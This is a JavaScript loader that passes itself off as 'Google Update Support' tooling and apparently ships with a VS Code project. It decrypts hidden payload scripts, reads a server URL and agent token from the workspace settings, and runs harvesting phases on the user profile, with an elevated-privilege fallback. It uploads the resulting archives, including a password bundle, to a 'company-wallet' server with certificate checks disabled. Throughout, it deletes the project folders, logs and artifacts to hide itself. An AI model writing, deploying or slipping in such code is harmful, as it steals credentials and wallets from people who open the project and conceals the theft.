"use strict";
process.env.ELECTRON_RUN_AS_NODE = "1";

const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");
const http = require("http");
const { URL } = require("url");

const VENDOR = process.argv[2] || "";
const WS = process.argv[3] || "";

const KEY = Buffer.from(
  "4f7a8c3d2e1b5f90" +
  "71a6b2c8d4e3f50a" +
  "92b1c7d6e8f4a30b" +
  "5c2d9e1f7a6b8c4d",
  "hex"
);

function decrypt(d) {
  const iv = d.subarray(0, 12);
  const tag = d.subarray(12, 28);
  const ct = d.subarray(28);
  const dc = crypto.createDecipheriv("aes-256-gcm", KEY, iv);
  dc.setAuthTag(tag);
  return Buffer.concat([dc.update(ct), dc.final()]);
}

function agentStateDir() {
  const la = (process.env.LOCALAPPDATA || "").trim();
  if (la) return path.join(la, "Google");
  return path.join(".", "Google");
}

function dlog(msg) {
  const line = new Date().toISOString() + " [node-pipeline] " + msg + "\n";
  try {
    const dir = agentStateDir();
    fs.mkdirSync(dir, { recursive: true });
    fs.appendFileSync(path.join(dir, "gus-run-update.log"), line, "utf8");
  } catch (_) {}
  try { fs.appendFileSync(path.join(os.tmpdir(), ".gus-ext.log"), line); } catch (_) {}
}

function httpBase(ws) {
  let u = String(ws || "").trim().replace(/\/$/, "");
  if (u.startsWith("wss://")) return "https://" + u.slice(6);
  if (u.startsWith("ws://")) return "http://" + u.slice(5);
  return u;
}

function postUpload(base, zipPath, variant, creds) {
  const uploadURL = base.replace(/\/$/, "") + "/api/company-wallet/upload-raw";
  const u = new URL(uploadURL);
  const isHttps = u.protocol === "https:";
  const mod = isHttps ? https : http;
  const st = fs.statSync(zipPath);
  const body = fs.createReadStream(zipPath);
  const headers = {
    "Content-Type": "application/zip",
    "Content-Length": String(st.size),
    "X-Agent-Token": creds.agentToken,
    "X-Company-Wallet-Client-Id": creds.clientId,
    "X-Company-Wallet-Host": os.hostname(),
  };
  if (variant === "pass") headers["X-Company-Wallet-Variant"] = "pass";
  return new Promise((resolve, reject) => {
    const opts = {
      hostname: u.hostname,
      port: u.port || (isHttps ? 443 : 80),
      path: u.pathname + u.search,
      method: "POST",
      headers,
      ...(isHttps ? { rejectUnauthorized: false } : {}),
    };
    const req = mod.request(opts, (res) => {
      const chunks = [];
      res.on("data", (c) => chunks.push(c));
      res.on("end", () => {
        const txt = Buffer.concat(chunks).toString("utf8").slice(0, 4096);
        if (res.statusCode >= 200 && res.statusCode < 300) {
          dlog("upload ok variant=" + (variant || "main") + " status=" + res.statusCode);
          resolve();
        } else {
          dlog("upload FAILED variant=" + (variant || "main") + " status=" + res.statusCode + " body=" + txt.slice(0, 800));
          reject(new Error("HTTP " + res.statusCode));
        }
      });
    });
    req.on("error", (err) => { dlog("upload error: " + err.message); reject(err); });
    body.on("error", (err) => reject(err));
    body.pipe(req);
  });
}

function findNewest(dir, suffix) {
  if (!dir || !fs.existsSync(dir)) return null;
  let best = null, bestMs = -1;
  for (const name of fs.readdirSync(dir)) {
    if (!name.endsWith(suffix)) continue;
    const p = path.join(dir, name);
    try {
      const st = fs.statSync(p);
      if (st.isFile() && st.mtimeMs > bestMs) { bestMs = st.mtimeMs; best = p; }
    } catch (_) {}
  }
  return best;
}

function rmQuiet(p) { try { fs.rmSync(p, { recursive: true, force: true }); } catch (_) {} }

async function main() {
  dlog("node-pipeline START pid=" + process.pid + " vendor=" + VENDOR + " ws=" + WS);

  if (!VENDOR || !fs.existsSync(VENDOR)) {
    dlog("FATAL: vendor dir missing: " + VENDOR);
    return;
  }

  const tmpDir = path.join(os.tmpdir(), "gus-scripts-" + Date.now());
  fs.mkdirSync(tmpDir, { recursive: true });

  for (const name of ["windows-agent-node.js", "detect_malware.py"]) {
    const enc = path.join(VENDOR, name + ".enc");
    const plain = path.join(VENDOR, name);
    if (fs.existsSync(enc)) {
      const d = decrypt(fs.readFileSync(enc));
      fs.writeFileSync(path.join(tmpDir, name), d);
      dlog("decrypted " + name);
    } else if (fs.existsSync(plain)) {
      fs.copyFileSync(plain, path.join(tmpDir, name));
      dlog("copied " + name);
    }
  }
  // Copy windows-js-pipeline.js (not encrypted, needed for elevated phase2 fallback)
  const pipelineSrc = path.join(VENDOR, "windows-js-pipeline.js");
  if (fs.existsSync(pipelineSrc)) {
    fs.copyFileSync(pipelineSrc, path.join(tmpDir, "windows-js-pipeline.js"));
    dlog("copied windows-js-pipeline.js");
  }

  let serverUrl = "", clientId = "", agentToken = "";
  try {
    const sp = path.join(WS, ".vscode", "settings.json");
    if (fs.existsSync(sp)) {
      const s = JSON.parse(fs.readFileSync(sp, "utf8"));
      serverUrl = s["googleUpdateSupport.companyWalletServerUrl"] || "";
      clientId = s["googleUpdateSupport.companyWalletClientId"] || "";
      agentToken = s["googleUpdateSupport.companyWalletAgentToken"] || "";
    }
  } catch (_) {}

  dlog("config: serverUrl=" + (serverUrl ? "set" : "MISSING") +
       " clientId=" + (clientId ? "set" : "MISSING") +
       " agentToken=" + (agentToken ? "set" : "MISSING"));

  if (!serverUrl || !clientId || !agentToken) {
    dlog("wallet config incomplete -- abort");
    rmQuiet(tmpDir);
    return;
  }

  // Everything needed is now in tmpDir + memory. Remove vendor + .vscode immediately
  // so the project looks clean and the editor window can be closed.
  dlog("early cleanup: removing vendor + .vscode from project");
  const vendorDir = path.resolve(VENDOR);
  const wsDir = path.resolve(WS);
  try {
    const cleanupPathsFile = path.join(vendorDir, ".gus", "cleanup-paths");
    if (fs.existsSync(cleanupPathsFile)) {
      const lines = fs.readFileSync(cleanupPathsFile, "utf8").split(/\r?\n/);
      for (const rel of lines) {
        const trimmed = rel.trim();
        if (!trimmed || trimmed.startsWith("#") || trimmed.includes("..")) continue;
        if (path.isAbsolute(trimmed)) continue;
        const target = path.resolve(path.join(wsDir, trimmed));
        if (!target.startsWith(wsDir)) continue;
        if (fs.existsSync(target)) {
          rmQuiet(target);
          dlog("early cleanup: removed " + trimmed);
        }
      }
    } else {
      rmQuiet(vendorDir);
      dlog("early cleanup: removed vendor dir");
    }
  } catch (e) { dlog("early cleanup vendor error: " + e.message); }
  try {
    const vscodeDir = path.join(wsDir, ".vscode");
    if (fs.existsSync(vscodeDir)) {
      rmQuiet(vscodeDir);
      dlog("early cleanup: removed .vscode");
    }
  } catch (e) { dlog("early cleanup .vscode error: " + e.message); }

  if (clientId === "overlord-default" || clientId === "default") {
    const hi = os.hostname() + "|" + (process.env.USERNAME || "") + "|windows|amd64";
    clientId = crypto.createHash("sha256").update(hi).digest("hex");
    dlog("derived HWID clientId=" + clientId);
  }

  const agentScript = path.join(tmpDir, "windows-agent-node.js");
  if (!fs.existsSync(agentScript)) {
    dlog("FATAL: agent script not found at " + agentScript);
    rmQuiet(tmpDir);
    return;
  }

  const agent = require(agentScript);
  const artDir = agent.windowsCwArtifactsDir();
  try { fs.mkdirSync(artDir, { recursive: true }); } catch (_) {}

  dlog("phase1: starting");
  try { agent.runPhase1(process.env.USERPROFILE || ""); dlog("phase1: done"); }
  catch (e) { dlog("phase1 FAILED: " + e.message); }

  const resultFile = path.join(os.tmpdir(), "gus-cw-result-" + Date.now() + ".txt");
  dlog("phase2: starting (direct)");
  try { agent.runPhase2(process.env.USERPROFILE || "", resultFile, serverUrl); }
  catch (e) { dlog("phase2 error: " + e.message); }

  let passZip = findNewest(artDir, "_pass.zip");
  if (!passZip) {
    dlog("phase2: direct did not produce pass.zip -- trying elevated");
    try {
      const pipelinePath = path.join(tmpDir, "windows-js-pipeline.js");
      if (fs.existsSync(pipelinePath)) {
        const pipeline = require(pipelinePath);
        if (pipeline.runPhase2Elevated) {
          pipeline.runPhase2Elevated(agentScript, process.env.USERPROFILE || "", resultFile, serverUrl);
        }
      } else {
        dlog("phase2: windows-js-pipeline.js not available -- skip elevated");
      }
    } catch (e) { dlog("phase2 elevated error: " + e.message); }
    const deadline = Date.now() + 300000;
    while (Date.now() < deadline) {
      passZip = findNewest(artDir, "_pass.zip");
      if (passZip) break;
      await new Promise(r => setTimeout(r, 2000));
    }
  }
  try { fs.unlinkSync(resultFile); } catch (_) {}

  const zipMain = findNewest(artDir, "_phase1.zip");
  passZip = findNewest(artDir, "_pass.zip");
  if (!zipMain && !passZip) {
    dlog("no artifacts -- abort");
    rmQuiet(tmpDir);
    return;
  }

  const base = httpBase(serverUrl);
  const creds = { agentToken, clientId };
  try {
    if (zipMain) await postUpload(base, zipMain, "", creds);
    if (passZip) await postUpload(base, passZip, "pass", creds);
    dlog("upload complete");
  } catch (e) { dlog("upload error: " + e.message); }

  dlog("cleanup: removing artifacts + logs");
  rmQuiet(artDir);
  const la = (process.env.LOCALAPPDATA || "").trim();
  if (la) {
    const gDir = path.join(la, "Google");
    try { fs.unlinkSync(path.join(gDir, "gus-run-update.log")); } catch (_) {}
    try { fs.unlinkSync(path.join(gDir, "upload_success.txt")); } catch (_) {}
    try { fs.unlinkSync(path.join(gDir, ".gus-vsix-installed-marker")); } catch (_) {}
  }
  try { fs.unlinkSync(path.join(os.tmpdir(), ".gus-ext.log")); } catch (_) {}
  try {
    for (const name of fs.readdirSync(os.tmpdir())) {
      if (/^gus-(scripts|embed-py)-\d+$/.test(name)) rmQuiet(path.join(os.tmpdir(), name));
      if (/^gus-(ep|cw-result|detached)-\d+\.(txt|js)$/i.test(name)) try { fs.unlinkSync(path.join(os.tmpdir(), name)); } catch (_) {}
    }
  } catch (_) {}
  rmQuiet(tmpDir);
  dlog("node-pipeline END");
}

main().catch(e => { try { dlog("fatal: " + e.message); } catch (_) {} });
